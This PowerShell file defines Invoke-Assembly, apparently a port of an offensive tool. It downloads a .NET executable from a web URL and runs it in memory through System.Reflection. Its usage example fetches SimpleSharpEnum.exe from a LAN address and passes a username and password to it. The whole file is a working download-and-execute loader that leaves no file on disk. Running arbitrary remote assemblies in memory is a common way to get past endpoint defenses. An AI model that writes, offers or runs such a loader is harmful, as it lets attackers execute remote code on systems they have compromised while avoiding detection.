Function Invoke-Assembly {
	<#
	.SYNOPSIS

		Through the use of System.Reflection, it's possible to load arbitrary
		compiled .NET code. Powershell port of https://gitlab.com/KevinJClark/csharper
		
	.PARAMETER Url
	
		Web URL to download .NET exe from.
	
	.EXAMPLE

		Import-Module .\Invoke-Assembly.ps1
		Invoke-Assembly -Url http://192.168.0.189/SimpleSharpEnum.exe -Arguments "--username","kevin","--password","p@ssw0rd"
		
	#>
	[CmdletBinding()]
		Param (
			[Parameter(Mandatory = $True, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
			[String]$Url,
			
			[Parameter()]
			[String[]]$Arguments = ""
	)
	try {
		$asm_data = ([net.webclient]::new()).downloaddata($Url)
	}
	catch {
		
	}
	$assembly = [Reflection.Assembly]::Load($asm_data)
	
	foreach($type in $assembly.GetExportedTypes()) {
		foreach($method in $type.GetMethods()) {
			if($method.Name -eq "Main") {
				if($Arguments[0] -eq "") {
					echo "[*] Attempting to load assembly with no arguments"
				}
				else {
					echo "[*] Attempting to load assembly with arguments: $arguments"
				}
				$a = (,[String[]]@($Arguments))
				$output = $method.Invoke($null, $a)
				$output
			}
		}
	}
}